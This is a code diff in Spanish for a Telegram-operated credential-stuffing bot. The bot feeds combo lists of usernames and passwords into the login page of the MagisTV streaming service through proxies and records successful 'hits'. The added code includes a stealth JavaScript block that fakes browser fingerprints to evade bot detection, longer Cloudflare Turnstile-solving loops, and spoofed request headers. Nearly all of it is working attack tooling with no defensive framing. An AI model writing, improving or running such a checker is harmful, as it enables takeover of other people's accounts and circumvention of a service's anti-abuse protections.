@@ -3,7 +3,7 @@
 """
 ╔══════════════════════════════════════════════════════════════╗
 ║   🎬 Flujo TV — Telegram Bot Checker (VPS Headless)        ║
-║   Multiprocessing + Sin single-process                      ║
+║   Debug + Screenshots + Anti-Detección Mejorada            ║
 ╚══════════════════════════════════════════════════════════════╝
 """
 
@@ -23,15 +23,16 @@ ADMIN_IDS = []
 
 BOT_DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_data")
 os.makedirs(BOT_DATA_DIR, exist_ok=True)
-
-# Archivo para comunicar stop entre procesos
 STOP_FILE = "/tmp/flujo_bot_stop"
+SCREENSHOT_DIR = os.path.join(BOT_DATA_DIR, "screenshots")
+os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
 bot_state = {
     "running": False,
     "current_chat": None,
     "_start_time": None,
     "_process": None,
+    "debug_sent": 0,
 }
 
 def get_proxy_conf():
@@ -91,6 +92,12 @@ def tg_send_doc(chat_id, filename, content, caption=None):
     params = {"chat_id": chat_id}
     if caption: params["caption"] = caption
     return tg_api("sendDocument", params, files=files, timeout=120)
+
+def tg_send_photo(chat_id, photo_bytes, caption=None):
+    files = {"photo": ("screenshot.png", photo_bytes)}
+    params = {"chat_id": chat_id}
+    if caption: params["caption"] = caption
+    return tg_api("sendPhoto", params, files=files, timeout=60)
 
 def tg_answer_cb(query_id, text=None, show_alert=False):
     params = {"callback_query_id": query_id}
@@ -158,7 +165,7 @@ def setup_deps():
     ocr = ensure_mod("ddddocr")
     if not pw: return False, False
     ok, out = run_cmd([sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"], timeout=300)
-    if not ok: print(f"  [!] Chromium install: {out[:200]}")
+    if not ok: print(f"  [!] Chromium: {out[:200]}")
     return True, ocr
 
 # ════════════════════════════════════════════════════════════════════════
@@ -205,8 +212,60 @@ def get_captcha_img(page):
     return None
 
 # ════════════════════════════════════════════════════════════════════════
-#  MOUSE + CF
+#  STEALTH SCRIPTS (anti-detección headless)
 # ════════════════════════════════════════════════════════════════════════
+
+STEALTH_JS = """
+// Ocultar webdriver
+Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+Object.defineProperty(navigator, 'languages', {get: () => ['es-ES', 'es', 'en-US', 'en']});
+Object.defineProperty(navigator, 'platform', {get: () => 'Linux armv81'});
+
+// Chrome runtime
+window.chrome = {runtime: {}, loadTimes: function(){}, csi: function(){}};
+
+// Permissions
+const originalQuery = window.navigator.permissions.query;
+window.navigator.permissions.query = (parameters) =>
+    parameters.name === 'notifications'
+        ? Promise.resolve({state: Notification.permission})
+        : originalQuery(parameters);
+
+// Plugins
+Object.defineProperty(navigator, 'plugins', {
+    get: () => [1, 2, 3, 4, 5].map(() => ({
+        name: 'Chrome PDF Plugin',
+        filename: 'internal-pdf-viewer',
+        description: 'Portable Document Format',
+        length: 1
+    }))
+});
+
+// WebGL
+const getParameter = WebGLRenderingContext.prototype.getParameter;
+WebGLRenderingContext.prototype.getParameter = function(parameter) {
+    if (parameter === 37445) return 'Intel Inc.';
+    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
+    return getParameter.call(this, parameter);
+};
+
+// Mouse tracking
+window._mx = 210;
+window._my = 450;
+document.addEventListener('mousemove', e => {
+    window._mx = e.clientX;
+    window._my = e.clientY;
+});
+
+// Iframe contentWindow fix
+const elementDescriptor = Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'contentWindow');
+Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {
+    get: function() {
+        const iframe = elementDescriptor.get.call(this);
+        try { return iframe; } catch(e) { return null; }
+    }
+});
+"""
 
 def human_click(page, x, y):
     steps = random.randint(20, 40)
@@ -224,7 +283,7 @@ def _has_login(page):
     try: return page.locator("input[type='text']").count() > 0
     except: return False
 
-def solve_turnstile(page, max_a=6):
+def solve_turnstile(page, max_a=8):
     for att in range(1, max_a+1):
         try:
             for ifr in page.locator("iframe").all():
@@ -234,9 +293,9 @@ def solve_turnstile(page, max_a=6):
                     box = ifr.bounding_box()
                     if box and box["width"] > 0:
                         page.mouse.move(box["x"]+random.randint(50,150), box["y"]+random.randint(-80,80))
-                        time.sleep(random.uniform(0.3, 0.7))
+                        time.sleep(random.uniform(0.5, 1.0))
                         human_click(page, box["x"]+28, box["y"]+box["height"]/2)
-                        page.wait_for_timeout(4000)
+                        page.wait_for_timeout(5000)
                         if _has_login(page): return True
         except: pass
         try:
@@ -249,14 +308,14 @@ def solve_turnstile(page, max_a=6):
                                 box = el.bounding_box()
                                 if box:
                                     human_click(page, box["x"]+box["width"]/2, box["y"]+box["height"]/2)
-                                    page.wait_for_timeout(4000)
+                                    page.wait_for_timeout(5000)
                                     if _has_login(page): return True
                         except: pass
         except: pass
         page.wait_for_timeout(2000)
     return False
 
-def handle_cf(page):
+def handle_cf(page, chat_id=None):
     page.wait_for_timeout(3000)
     if _has_login(page): return True
     has_ts = False
@@ -266,7 +325,7 @@ def handle_cf(page):
             if "challenges.cloudflare.com" in s or "turnstile" in t.lower(): has_ts = True; break
     except: pass
     if not has_ts:
-        for _ in range(15):
+        for _ in range(20):
             page.wait_for_timeout(1000)
             if _has_login(page): return True
             try:
@@ -274,8 +333,10 @@ def handle_cf(page):
                     if "challenges.cloudflare.com" in (fr.url or ""): has_ts = True; break
             except: pass
             if has_ts: break
-    if has_ts: return solve_turnstile(page)
-    for _ in range(30):
+    if has_ts:
+        if solve_turnstile(page): return True
+    # Último intento: esperar más
+    for _ in range(20):
         page.wait_for_timeout(1000)
         if _has_login(page): return True
     return False
@@ -333,6 +394,24 @@ def check_ip_fast(context):
         except: pass
         return "?"
 
+def send_debug_screenshot(page, chat_id, label="debug"):
+    """Toma screenshot y la envía por TG (máx 3 por check para no flood)"""
+    if bot_state.get("debug_sent", 0) >= 3: return
+    try:
+        path = os.path.join(SCREENSHOT_DIR, f"{label}_{int(time.time())}.png")
+        page.screenshot(path=path, full_page=False)
+        with open(path, "rb") as f:
+            img_data = f.read()
+        # Obtener título y URL para contexto
+        title = page.title() or "?"
+        url = page.url or "?"
+        caption = f"🐛 <b>Debug:</b> {label}\n📄 {escape_html(title)}\n🔗 {escape_html(url)}"
+        tg_send_photo(chat_id, img_data, caption=caption)
+        bot_state["debug_sent"] = bot_state.get("debug_sent", 0) + 1
+        os.remove(path)
+    except Exception as e:
+        print(f"  [!] Screenshot error: {e}")
+
 # ════════════════════════════════════════════════════════════════════════
 #  PROGRESO
 # ════════════════════════════════════════════════════════════════════════
@@ -367,7 +446,7 @@ def update_progress(chat_id, msg_id, account_name, result_str, stats):
     except: pass
 
 # ════════════════════════════════════════════════════════════════════════
-#  MOTOR DE CHECK (PROCESO SEPARADO - SOLUCIÓN AL CRASH)
+#  MOTOR DE CHECK
 # ════════════════════════════════════════════════════════════════════════
 
 def run_checker(accounts, chat_id, msg_id, use_proxy):
@@ -378,6 +457,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
     processed = 0
     fails = 0
     start_time = time.time()
+    bot_state["debug_sent"] = 0
     stats = {
         "total": len(accounts), "hits": 0, "fails": 0,
         "processed": 0, "start_time": start_time, "ip": "?",
@@ -387,21 +467,28 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
     UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
 
     with sync_playwright() as p:
-        # SIN --single-process (eso causaba crash en VPS)
         browser = p.chromium.launch(
             headless=True,
             args=[
                 "--disable-blink-features=AutomationControlled",
                 "--no-sandbox", "--disable-dev-shm-usage",
-                "--disable-gpu", "--disable-extensions",
+                "--disable-gpu",
                 "--disable-features=IsolateOrigins,site-per-process",
+                "--disable-infobars",
+                "--window-size=420,900",
+                "--disable-background-timer-throttling",
+                "--disable-backgrounding-occluded-windows",
+                "--disable-renderer-backgrounding",
+                "--no-first-run",
+                "--no-default-browser-check",
+                "--disable-extensions",
             ],
         )
         idx = 0
         batch_num = 0
+        consecutive_cf_fails = 0
 
         while idx < len(accounts):
-            # Leer archivo para saber si hay que parar
             if os.path.exists(STOP_FILE):
                 try: tg_edit_msg(chat_id, msg_id, "⏹ <b>Detenido por usuario</b>", reply_markup=kb_main())
                 except: pass
@@ -415,6 +502,17 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 "user_agent": UA,
                 "viewport": {"width": 420, "height": 900},
                 "is_mobile": True, "has_touch": True,
+                "screen": {"width": 420, "height": 900},
+                "device_scale_factor": 2.5,
+                "extra_http_headers": {
+                    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                    "Sec-Fetch-Dest": "document",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Site": "none",
+                    "Sec-Fetch-User": "?1",
+                    "Upgrade-Insecure-Requests": "1",
+                },
             }
             if use_proxy:
                 ctx_kw["proxy"] = get_proxy_conf()
@@ -423,11 +521,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
             page = None
             try:
                 context = browser.new_context(**ctx_kw)
-                context.add_init_script(
-                    "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
-                    "window._mx=210;window._my=450;"
-                    "document.addEventListener('mousemove',e=>{window._mx=e.clientX;window._my=e.clientY})"
-                )
+                context.add_init_script(STEALTH_JS)
                 page = context.new_page()
             except Exception as e:
                 print(f"  [!] Context error: {e}")
@@ -436,27 +530,76 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
                 update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Ctx error: {str(e)[:40]}", stats)
                 idx = batch_end; continue
 
+            # Navegar
             nav_ok = False
-            for _ in range(3):
+            nav_error = ""
+            for attempt in range(3):
                 try:
-                    page.goto("https://vip.magistv.net/mobile/login", wait_until="domcontentloaded", timeout=45000)
+                    page.goto("https://vip.magistv.net/mobile/login", 
+                             wait_until="domcontentloaded", timeout=45000)
                     nav_ok = True; break
-                except: time.sleep(2)
+                except Exception as e:
+                    nav_error = str(e)[:80]
+                    time.sleep(3)
 
-            if not nav_ok or not handle_cf(page):
+            if not nav_ok:
                 fails += (batch_end - idx); processed += (batch_end - idx)
                 stats["fails"] = fails; stats["processed"] = processed
-                update_progress(chat_id, msg_id, f"Batch {batch_num}", "Nav/CF fail", stats)
+                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Nav fail: {nav_error}", stats)
+                consecutive_cf_fails += 1
+                # Enviar screenshot y debug
+                try:
+                    send_debug_screenshot(page, chat_id, f"nav_fail_b{batch_num}")
+                    tg_send_msg(chat_id, f"🐛 <b>Nav Fail Batch {batch_num}</b>\nError: <code>{escape_html(nav_error)}</code>\nURL: <code>{escape_html(page.url)}</code>\nTitle: <code>{escape_html(page.title())}</code>",
+                              disable_notification=True)
+                except: pass
+                # Si falla 3 batches seguidos, pausar un poco
+                if consecutive_cf_fails >= 3:
+                    tg_send_msg(chat_id, "⚠️ 3 batches seguidos fallando nav — esperando 15s...", disable_notification=True)
+                    time.sleep(15)
+                    consecutive_cf_fails = 0
                 idx = batch_end
                 try: context.close()
                 except: pass
                 continue
 
+            # Cloudflare
+            cf_ok = handle_cf(page, chat_id)
+            if not cf_ok:
+                fails += (batch_end - idx); processed += (batch_end - idx)
+                stats["fails"] = fails; stats["processed"] = processed
+                update_progress(chat_id, msg_id, f"Batch {batch_num}", "CF fail", stats)
+                consecutive_cf_fails += 1
+                # Enviar screenshot del CF
+                try:
+                    send_debug_screenshot(page, chat_id, f"cf_fail_b{batch_num}")
+                    tg_send_msg(chat_id, f"🐛 <b>CF Fail Batch {batch_num}</b>\nURL: <code>{escape_html(page.url)}</code>\nTitle: <code>{escape_html(page.title())}</code>\nIfs: {page.locator('iframe').count()}",
+                              disable_notification=True)
+                except: pass
+                if consecutive_cf_fails >= 3:
+                    tg_send_msg(chat_id, "⚠️ 3 batches con CF — esperando 20s...", disable_notification=True)
+                    time.sleep(20)
+                    consecutive_cf_fails = 0
+                idx = batch_end
+                try: context.close()
+                except: pass
+                continue
+
+            # CF resuelto OK
+            consecutive_cf_fails = 0
+
+            # Verificar IP
             if use_proxy:
                 ip = check_ip_fast(context)
                 stats["ip"] = ip
-                print(f"  [🔄] Batch {batch_num} — IP: {ip}")
+                print(f"  [🔄] Batch {batch_num} — IP: {ip} — Cuentas {idx+1}-{batch_end}")
+                if ip == "?":
+                    try:
+                        send_debug_screenshot(page, chat_id, f"ip_unknown_b{batch_num}")
+                        tg_send_msg(chat_id, f"⚠️ <b>IP desconocida</b> Batch {batch_num} — el proxy podría no estar funcionando", disable_notification=True)
+                    except: pass
 
+            # Interceptor
             state = {}
             NON_LOGIN = ["/codigo", "/info", "/dashboard", "/home/img", "/img"]
 
@@ -531,7 +674,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
 
                 page.wait_for_timeout(1200)
                 if not _has_login(page):
-                    if not handle_cf(page):
+                    if not handle_cf(page, chat_id):
                         fails += 1; stats["fails"] = fails
                         reason = "CF fail"; errors[reason] = errors.get(reason, 0) + 1
                         update_progress(chat_id, msg_id, user, reason, stats)
@@ -704,7 +847,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy):
     return hits, hits_lines
 
 # ════════════════════════════════════════════════════════════════════════
-#  START CHECK (MULTIPROCESSING EN VEZ DE THREADING)
+#  START CHECK
 # ════════════════════════════════════════════════════════════════════════
 
 waiting_combo = set()
@@ -713,14 +856,12 @@ def start_check(accounts, chat_id):
     if bot_state["running"]:
         tg_send_msg(chat_id, "⏳ Ya hay un check en proceso.", reply_markup=kb_main())
         return
-    
-    # Limpiar flag de stop
     if os.path.exists(STOP_FILE): os.remove(STOP_FILE)
-    
     bot_state["running"] = True
     bot_state["current_chat"] = chat_id
     bot_state["_start_time"] = time.time()
-    
+    bot_state["debug_sent"] = 0
+
     tg_send_msg(chat_id, f"🚀 <b>Iniciando check...</b>\n📊 {len(accounts)} cuentas")
     r = tg_send_msg(chat_id, "⏳ Preparando...", reply_markup=kb_cancel())
     prog_msg_id = r.get("result", {}).get("message_id") if r.get("ok") else None
@@ -753,7 +894,6 @@ def start_check(accounts, chat_id):
             try: tg_send_msg(chat_id, err_txt, reply_markup=kb_main())
             except: pass
 
-    # MULTIPROCESSING = proceso real separado, no thread
     p = multiprocessing.Process(target=worker, args=(accounts, chat_id, prog_msg_id, True), daemon=True)
     p.start()
     bot_state["_process"] = p
@@ -789,11 +929,10 @@ def process_update(upd):
                         tg_send_msg(chat_id, f"📄 Archivo: <b>{len(accounts)}</b> cuentas válidas")
                         start_check(accounts, chat_id)
                     else:
-                        tg_send_msg(chat_id, "❌ No se encontraron cuentas válidas en el archivo.", reply_markup=kb_main())
+                        tg_send_msg(chat_id, "❌ No se encontraron cuentas válidas.", reply_markup=kb_main())
                 else:
                     tg_send_msg(chat_id, "❌ No pude descargar el archivo.", reply_markup=kb_main())
                 return
-
             elif text and not text.startswith("/"):
                 accounts = parse_combo(text)
                 if accounts:
@@ -828,10 +967,8 @@ def process_update(upd):
         elif text.startswith("/proxy"):
             parts = text.split()
             if len(parts) >= 5:
-                PROXY["host"] = parts[1]
-                PROXY["port"] = int(parts[2])
-                PROXY["user"] = parts[3]
-                PROXY["pass"] = parts[4]
+                PROXY["host"] = parts[1]; PROXY["port"] = int(parts[2])
+                PROXY["user"] = parts[3]; PROXY["pass"] = parts[4]
                 tg_send_msg(chat_id, f"🔄 Proxy: <code>{PROXY['host']}:{PROXY['port']}</code>", reply_markup=kb_main())
             else:
                 tg_send_msg(chat_id, f"Proxy:\n<code>{PROXY['host']}:{PROXY['port']}</code>\n<code>/proxy host port user pass</code>", reply_markup=kb_main())
@@ -849,7 +986,6 @@ def process_update(upd):
         msg_id = cbq["message"]["message_id"]
         if user_id and user_id not in ADMIN_IDS:
             ADMIN_IDS.append(user_id)
-
         if data == "send_combo":
             if bot_state["running"]:
                 tg_answer_cb(cbq["id"], "⏳ Ya hay un check en proceso", show_alert=True)
@@ -886,31 +1022,26 @@ def main():
     print(f"  [✓] Playwright OK | OCR: {'✅' if ocr_ok else '❌'}")
     print(f"  [✓] Proxy: {PROXY['host']}:{PROXY['port']}")
     print(f"  [✓] Rotar cada: {ROTATE_EVERY} cuentas")
-    print(f"  [✓] Headless: SÍ | Multiprocessing: SÍ")
+    print(f"  [✓] Headless + Stealth + Screenshots")
     print()
     tg_api("deleteWebhook", {"drop_pending_updates": True})
     print("  [✓] Bot iniciado — Esperando mensajes...")
-    print("  [*] Envía /start a tu bot en Telegram")
     print()
 
     offset = None
     while True:
-        # Auto-limpiar estado cuando el proceso hijo termina
         if bot_state["running"] and bot_state.get("_process") and not bot_state["_process"].is_alive():
             bot_state["running"] = False
             bot_state["current_chat"] = None
             print("  [*] Proceso de check finalizado.")
-
         try:
             params = {"timeout": 35, "allowed_updates": '["message","callback_query"]'}
             if offset: params["offset"] = offset
             result = tg_api("getUpdates", params, timeout=40)
             if result.get("ok") and result.get("result"):
                 for upd in result["result"]:
-                    try:
-                        process_update(upd)
-                    except Exception as e:
-                        print(f"  [!] Update error: {e}")
+                    try: process_update(upd)
+                    except Exception as e: print(f"  [!] Update error: {e}")
                     offset = upd["update_id"] + 1
         except urllib.error.URLError as e:
             print(f"  [!] Red: {e} — 5s...")
@@ -920,10 +1051,8 @@ def main():
             time.sleep(3)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n  [*] Bot detenido.")
+    try: main()
+    except KeyboardInterrupt: print("\n  [*] Bot detenido.")
     except Exception as e:
         print(f"\n  [✗] {e}")
         traceback.print_exc()
